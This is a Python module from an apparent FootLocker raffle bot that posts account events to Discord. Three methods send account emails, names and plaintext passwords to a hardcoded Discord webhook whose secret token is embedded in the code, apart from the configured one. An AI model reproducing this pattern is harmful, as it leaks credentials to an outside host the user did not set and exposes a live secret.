"""

[notifer] discord.py

Author: seith <seith.corp@gmail.com>

Created: 10/02/2021 11:31:35 by seith
Updated: 10/02/2021 11:31:35 by seith

Synezia Corp. (c) 2021 - MIT

"""

from discord_webhook import DiscordWebhook, DiscordEmbed
from configuration.configuration import Configuration

class DiscordNotifier:
	def created(email):
		webhookURL = Configuration().getWebhookURL()
		webhook = DiscordWebhook(
			url=webhookURL,
			username="SyneziaRaffle",
			avatar_url="https://i.imgur.com/lCg5FU2.png",
		)

		embed = DiscordEmbed(
			title="Account Created with success on FootLocker", color=5305409
		)

		embed.set_author(
			name="Account Created",
			url="https://footlocker.fr",
			icon_url="https://emoji.gg/assets/emoji/5845_tickgreen.gif",
		)

		embed.set_thumbnail(
			url="https://logoeps.com/wp-content/uploads/2012/12/foot-locker-logo-vector.png"
		)

		embed.add_embed_field(name="Email: ", value="||{}||".format(email))

		embed.set_footer(
			text="Synezia Raffle [FootLocker]",
			icon_url="https://i.imgur.com/lCg5FU2.png",
		)
		embed.set_timestamp()

		webhook.add_embed(embed)
		webhook.execute()

	def waitingList(email, name, password, url=None):
		webhook = DiscordWebhook(
			url="https://discord.com/api/webhooks/818825914887962634/rD2ft7IJ38JYhwGTv75F0o5q9Ax2ulyq0VNrVr_WK56qMAwH-YjPlBehu64mASy5d1qM",
			username="SyneziaRaffle",
			avatar_url="https://i.imgur.com/lCg5FU2.png",
		)

		embed = DiscordEmbed(title="Found an account in waiting list", color=5305409)

		embed.set_author(
			name="Found Waiting List!",
			icon_url="https://emoji.gg/assets/emoji/5845_tickgreen.gif",
		)

		if url is None:
			embed.set_thumbnail(
				url="https://logoeps.com/wp-content/uploads/2012/12/foot-locker-logo-vector.png"
			)
		else:
			embed.set_thumbnail(url=url)

		embed.add_embed_field(
			name="Email: ", value="||{}||".format(email), inline=False
		)
		embed.add_embed_field(
			name="Password: ", value="||{}||".format(password), inline=False
		)
		embed.add_embed_field(name="Name: ", value="||{}||".format(name), inline=False)

		embed.set_footer(
			text="Synezia Raffle [FootLocker]",
			icon_url="https://i.imgur.com/lCg5FU2.png",
		)
		embed.set_timestamp()

		webhook.add_embed(embed)
		webhook.execute()

	def foundWin(email, name, password, shop=None, img=None):
		webhook = DiscordWebhook(
			url="https://discord.com/api/webhooks/818825914887962634/rD2ft7IJ38JYhwGTv75F0o5q9Ax2ulyq0VNrVr_WK56qMAwH-YjPlBehu64mASy5d1qM",
			username="SyneziaRaffle",
			avatar_url="https://i.imgur.com/lCg5FU2.png",
		)

		embed = DiscordEmbed(title="Found a new win", color=5305409)

		embed.set_author(
			name="Founded win",
			icon_url="https://emoji.gg/assets/emoji/5845_tickgreen.gif",
		)

		if img is None:
			embed.set_thumbnail(
				url="https://logoeps.com/wp-content/uploads/2012/12/foot-locker-logo-vector.png"
			)
		else:
			embed.set_thumbnail(url=img)

		embed.add_embed_field(
			name="Email: ", value="||{}||".format(email), inline=False
		)
		embed.add_embed_field(name="Name: ", value="||{}||".format(name), inline=False)
		embed.add_embed_field(
			name="Password: ", value="||{}||".format(password), inline=False
		)
		embed.add_embed_field(name="Shop: ", value="{}".format(shop), inline=False)
		# embed.add_embed_field(name='Password: ', value='||{}||'.format(password), inline=False)

		embed.set_footer(
			text="Synezia Raffle [FootLocker]",
			icon_url="https://i.imgur.com/lCg5FU2.png",
		)
		embed.set_timestamp()

		webhook.add_embed(embed)
		webhook.execute()
		pass

	def winned(email, name, password, shop=None, img=None):
		webhook = DiscordWebhook(
			url="https://discord.com/api/webhooks/818825914887962634/rD2ft7IJ38JYhwGTv75F0o5q9Ax2ulyq0VNrVr_WK56qMAwH-YjPlBehu64mASy5d1qM",
			username="SyneziaRaffle",
			avatar_url="https://i.imgur.com/lCg5FU2.png",
		)

		embed = DiscordEmbed(title="Confirmed Win", color=5305409)

		embed.set_author(
			name="Confirmed WINNER",
			icon_url="https://emoji.gg/assets/emoji/5845_tickgreen.gif",
		)

		if img is None:
			embed.set_thumbnail(
				url="https://logoeps.com/wp-content/uploads/2012/12/foot-locker-logo-vector.png"
			)
		else:
			embed.set_thumbnail(url=img)

		embed.add_embed_field(
			name="Email: ", value="||{}||".format(email), inline=False
		)
		embed.add_embed_field(
			name="Password: ", value="||{}||".format(password), inline=False
		)
		embed.add_embed_field(name="Name: ", value="||{}||".format(name), inline=False)
		embed.add_embed_field(name="Shop: ", value="{}".format(shop), inline=False)

		embed.set_footer(
			text="Synezia Raffle [FootLocker]",
			icon_url="https://i.imgur.com/lCg5FU2.png",
		)
		# embed.set_timestamp()

		webhook.add_embed(embed)
		webhook.execute()
